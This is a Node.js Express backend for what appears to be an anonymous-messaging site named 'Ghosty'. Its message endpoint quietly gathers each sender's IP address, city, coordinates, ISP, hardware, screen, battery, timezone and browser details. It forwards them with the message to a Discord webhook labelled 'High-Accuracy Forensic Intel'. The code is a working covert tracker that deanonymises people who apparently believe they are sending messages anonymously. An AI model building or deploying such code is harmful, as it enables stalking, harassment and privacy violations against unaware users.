const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const rateLimit = require('express-rate-limit');

const app = express();

// 🛡️ SPAM SHIELD: 1 message every 30 seconds per IP
const msgLimiter = rateLimit({
    windowMs: 30 * 1000,
    max: 1,
    handler: (req, res) => {
        res.status(429).json({ error: "Ghost is resting! Please wait 30 seconds. 👻" });
    },
    standardHeaders: true,
    legacyHeaders: false,
});

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const DISCORD_WEBHOOK = process.env.WEBHOOK_URL;

// 🕵️ API ROUTE: Receives message and high-accuracy forensic intel
app.post('/api/send', msgLimiter, async (req, res) => {
    const { message, deviceInfo } = req.body;

    // High-Accuracy Vercel Headers
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Hidden";
    const city = req.headers['x-vercel-ip-city'] || "Unknown";
    const country = req.headers['x-vercel-ip-country'] || "Unknown";
    const region = req.headers['x-vercel-ip-country-region'] || "Unknown";
    const isp = req.headers['x-vercel-ip-as-number'] || "Unknown ISP";
    const latitude = req.headers['x-vercel-ip-latitude'] || "N/A";
    const longitude = req.headers['x-vercel-ip-longitude'] || "N/A";

    if (!DISCORD_WEBHOOK) return res.status(500).json({ error: "Server Configuration Error" });
    if (!message || message.length < 2) return res.status(400).json({ error: "Message too short!" });

    // Fallback for missing device info
    const safeDeviceInfo = deviceInfo || {
        hardware: { cores: "N/A", ram: "N/A", platform: "N/A" },
        network: { type: "N/A", downlink: "N/A" },
        display: { res: "N/A", ratio: "N/A" },
        battery: { level: "N/A", charging: "N/A" },
        timezone: "N/A",
        browser: { lang: "N/A", name: "N/A" }
    };

    try {
        const response = await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: "🕵️ High-Accuracy Forensic Intel",
                    color: 15548997, // Red color for serious intel
                    fields: [
                        { name: "📝 Message", value: `\`\`\`${message}\`\`\`` },
                        { name: "📍 Geo-Coordinates", value: `City: ${city}, ${region}, ${country}\nLat: ${latitude}, Lon: ${longitude}`, inline: true },
                        { name: "🌐 Network & ISP", value: `ISP Code: ${isp}\nType: ${safeDeviceInfo.network.type}\nSpeed: ${safeDeviceInfo.network.downlink}`, inline: true },
                        { name: "💻 Hardware Intel", value: `CPU: ${safeDeviceInfo.hardware.cores} Cores\nRAM: ${safeDeviceInfo.hardware.ram}\nPlatform: ${safeDeviceInfo.hardware.platform}`, inline: true },
                        { name: "📱 Screen & Display", value: `Res: ${safeDeviceInfo.display.res}\nRatio: ${safeDeviceInfo.display.ratio}x`, inline: true },
                        { name: "🔋 Power Status", value: `Level: ${safeDeviceInfo.battery.level}\nCharging: ${safeDeviceInfo.battery.charging}`, inline: true },
                        { name: "🕒 Senders Time", value: `Timezone: ${safeDeviceInfo.timezone}\nLang: ${safeDeviceInfo.browser.lang}`, inline: true }
                    ],
                    footer: { text: `Client IP: ||${ip}|| | User-Agent: ${safeDeviceInfo.browser.name.substring(0, 50)}...` },
                    timestamp: new Date()
                }]
            })
        });

        if (response.ok) res.json({ success: true });
        else throw new Error("Discord Error");
    } catch (err) {
        console.error("Error sending to Discord:", err);
        res.status(500).json({ error: "Failed to vanish message." });
    }
});

// Serve frontend
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start server (for local testing)
if (process.env.NODE_ENV !== 'production') {
    const PORT = process.env.PORT || 3000;
    app.listen(PORT, () => console.log(`🚀 Ghosty live: http://localhost:${PORT}`));
}

module.exports = app;